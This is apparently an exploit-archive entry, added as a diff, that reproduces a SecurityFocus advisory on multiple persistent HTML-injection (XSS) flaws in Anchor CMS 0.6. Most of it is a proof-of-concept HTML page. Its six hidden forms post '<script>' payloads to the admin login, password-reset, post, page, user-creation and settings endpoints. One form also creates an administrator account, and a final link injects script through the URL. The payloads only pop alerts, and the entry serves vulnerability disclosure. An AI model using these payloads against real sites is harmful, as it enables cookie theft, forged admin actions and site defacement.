@@ -1,0 +1,93 @@
+source: http://www.securityfocus.com/bid/53181/info
+
+Anchor CMS is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Attacker-supplied HTML and script code could be executed in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks may also be possible.
+
+Anchor CMS 0.6-14-ga85d0a0 is vulnerable; other versions may also be affected. 
+
+<html>
+<title>Anchor CMS v0.6 Multiple Persistent XSS Vulnerabilities</title>
+<body bgcolor="#000000">
+<script type="text/javascript">
+function xss0(){document.forms["xss0"].submit();}
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+function xss3(){document.forms["xss3"].submit();}
+function xss4(){document.forms["xss4"].submit();}
+function xss5(){document.forms["xss5"].submit();}
+</script>
+
+<form action="http://www.example.com/anchorcms/index.php/admin/users/login" enctype="application/x-www-form-urlencoded" method="POST" id="xss0">
+<input type="hidden" name="user" value='"><script>alert(1);</script>' />
+<input type="hidden" name="pass" value="admin" />
+</form>
+
+<form action="http://www.example.com/anchorcms/index.php/admin/users/amnesia" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="email" value='"><script>alert(1);</script>' />
+</form>
+
+<form action="http://www.example.com/anchorcms/index.php/admin/posts/add" enctype="application/x-www-form-urlencoded" method="POST" id="xss2">
+<input type="hidden" name="title" value='"><script>alert(1);</script>' />
+<input type="hidden" name="comments" value="1" />
+<input type="hidden" name="css" value="" />
+<input type="hidden" name="description" value="ZSL" />
+<input type="hidden" name="html" value="1" />
+<input type="hidden" name="js" value="" />
+<input type="hidden" name="slug" value='"><script>alert(2);</script>' />
+<input type="hidden" name="status" value="published" />
+</form>
+
+<form action="http://www.example.com/anchorcms/index.php/admin/pages/add" enctype="application/x-www-form-urlencoded" method="POST" id="xss3">
+<input type="hidden" name="name" value='"><script>alert(1);</script>' />
+<input type="hidden" name="title" value='"><script>alert(2);</script>' />
+<input type="hidden" name="content" value="Zero Science Lab" />
+<input type="hidden" name="slug" value="ZSL" />
+<input type="hidden" name="status" value="published" />
+</form>
+
+<form action="http://www.example.com/anchorcms/index.php/admin/users/add" enctype="application/x-www-form-urlencoded" method="POST" id="xss4">
+<input type="hidden" name="real_name" value='"><script>alert(1);</script>' />
+<input type="hidden" name="bio" value="MK" />
+<input type="hidden" name="email" value='"><script>alert(3);</script>' />
+<input type="hidden" name="password" value="admin" />
+<input type="hidden" name="role" value="administrator" />
+<input type="hidden" name="status" value="active" />
+<input type="hidden" name="username" value='"><script>alert(2);</script>' />
+</form>
+
+<form action="http://www.example.com/anchorcms/index.php/admin/metadata" enctype="application/x-www-form-urlencoded" method="POST" id="xss5">
+<input type="hidden" name="auto_published_comments" value="1" />
+<input type="hidden" name="description" value='"><script>alert(1);</script>' />
+<input type="hidden" name="home_page" value="1" />
+<input type="hidden" name="posts_page" value="1" />
+<input type="hidden" name="posts_per_page" value="1" />
+<input type="hidden" name="save" value="" />
+<input type="hidden" name="sitename" value='"><script>alert(2);</script>' />
+<input type="hidden" name="theme" value="default" />
+<input type="hidden" name="twitter" value='"><script>alert(3);</script>' />
+</form>
+
+<br /><br />
+
+<a href="javascript: xss0();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 0</h3></font></b></a><br />
+
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 1</h3></font></b></a><br />
+
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 2</h3></font></b></a><br />
+
+<a href="javascript: xss3();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 3</h3></font></b></a><br />
+
+<a href="javascript: xss4();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 4</h3></font></b></a><br />
+
+<a href="javascript: xss5();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 5</h3></font></b></a><br />
+
+<a href='http://www.example.com/anchorcms/index.php/"><script>alert(1);</script>'>XSS 6</a>
+
+</body></html>
